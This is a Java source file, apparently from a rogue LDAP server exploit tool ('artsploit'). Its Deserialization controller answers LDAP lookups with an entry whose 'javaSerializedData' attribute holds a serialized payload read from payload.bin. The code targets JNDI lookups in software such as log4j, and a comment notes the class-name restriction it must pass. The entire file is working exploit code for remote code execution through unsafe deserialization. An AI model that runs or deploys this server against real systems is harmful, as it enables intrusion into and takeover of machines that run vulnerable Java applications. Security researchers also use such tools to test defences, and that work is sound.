package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.makeJavaScriptString;
import static artsploit.Utilities.readSerializedPayload;

@LdapMapping(uri = { "/o=deserialization" })
public class Deserialization implements LdapController {

        public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP Deserialization result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); // This needs to be one of the log4j allowed classes

        e.addAttribute("javaSerializedData", readSerializedPayload("payload.bin"));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
